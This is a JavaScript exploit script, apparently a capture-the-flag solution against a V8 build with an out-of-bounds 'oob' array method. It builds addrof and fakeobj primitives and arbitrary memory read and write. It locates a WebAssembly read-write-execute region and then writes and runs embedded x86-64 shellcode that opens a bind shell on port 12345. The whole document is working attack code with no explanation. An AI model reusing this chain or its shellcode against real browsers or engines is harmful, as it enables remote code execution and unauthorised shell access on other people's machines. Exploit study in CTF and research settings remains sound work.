let fi_buf = new ArrayBuffer(8);
let f_buf = new Float64Array(fi_buf);
let i_buf = new BigUint64Array(fi_buf);

/* convert bigint to float */
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

/* convert float to bigint */
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

/* convert bigint to hex string */
function hex(i) {
    return '0x' + i.toString(16)
}


let float_arr;
let obj_arr;
let float_arr_map;
let obj_arr_map;

(function trigger() {
    float_arr = [1.1];
    let tmp_obj = {};
    obj_arr = [tmp_obj];

    float_arr_map = ftoi(float_arr.oob());
    obj_arr_map = ftoi(obj_arr.oob());
    // console.log(`[+] Map of float array: ${hex(float_arr_map)}`);
    // console.log(`[+] Map of object array: ${hex(obj_arr_map)}`);
})();


/* get address of |obj| */
function addrof(obj) {
    obj_arr[0] = obj;
    obj_arr.oob(itof(float_arr_map)); // overwrite map of |obj_arr| with map of |float_arr|
    let addr = ftoi(obj_arr[0]);
    obj_arr.oob(itof(obj_arr_map)); // restore map of |obj_arr|
    return addr;
}

/* generate fake object at |addr| */
function fakeobj(addr) {
    obj_arr.oob(itof(float_arr_map)); // overwrite map of |obj_arr| with map of |float_arr|
    obj_arr[0] = itof(addr);
    obj_arr.oob(itof(obj_arr_map)); // restore map of |obj_arr|
    return obj_arr[0];
}


let fake_arr_struct = [itof(float_arr_map), 2.2, 3.3, itof(1n << 32n)];

/* read 8bytes from |addr| */
function aar(addr) {
    fake_arr_struct[2] = itof(addr - 0x10n);
    let fake_arr = fakeobj(addrof(fake_arr_struct) - 0x20n);
    return ftoi(fake_arr[0]);
}

/* write 8bytes |value| to |addr| */
function aaw(addr, value) {
    fake_arr_struct[2] = itof(addr - 0x10n);
    let fake_arr = fakeobj(addrof(fake_arr_struct) - 0x20n);
    fake_arr[0] = itof(value);
}


/* get rwx region */

let instance = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x4, 0x1, 0x2, 0x0, 0xb]))); // (module (func (export "main")))
let rwx = aar(addrof(instance) + 0x88n);
// console.log(`[+] Address of RWX region: ${hex(rwx)}`);


/* execute shellcode */

let shellcode = [0x6a, 0x29, 0x58, 0x6a, 0x2, 0x5f, 0x6a, 0x1, 0x5e, 0x99, 0xf, 0x5, 0x52, 0xba, 0x1, 0x1, 0x1, 0x1, 0x81, 0xf2, 0x3, 0x1, 0x31, 0x38, 0x52, 0x6a, 0x10, 0x5a, 0x48, 0x89, 0xc5, 0x48, 0x89, 0xc7, 0x6a, 0x31, 0x58, 0x48, 0x89, 0xe6, 0xf, 0x5, 0x6a, 0x32, 0x58, 0x48, 0x89, 0xef, 0x6a, 0x1, 0x5e, 0xf, 0x5, 0x6a, 0x2b, 0x58, 0x48, 0x89, 0xef, 0x31, 0xf6, 0x99, 0xf, 0x5, 0x48, 0x89, 0xc7, 0x6a, 0x2, 0x5e, 0x6a, 0x21, 0x58, 0xf, 0x5, 0x48, 0xff, 0xce, 0x79, 0xf6, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5]; // pwn.shellcraft.bindsh(12345)

let buf = new ArrayBuffer(shellcode.length);
aaw(addrof(buf) + 0x20n, rwx); // overwrite backing store of |buf| with address of rwx region

let view = new DataView(buf);
for (let i = 0; i < shellcode.length; i++) {
    view.setUint8(i, shellcode[i]); // write shellcode to rwx region
}

instance.exports.main(); // call exported main() => execute shellcode
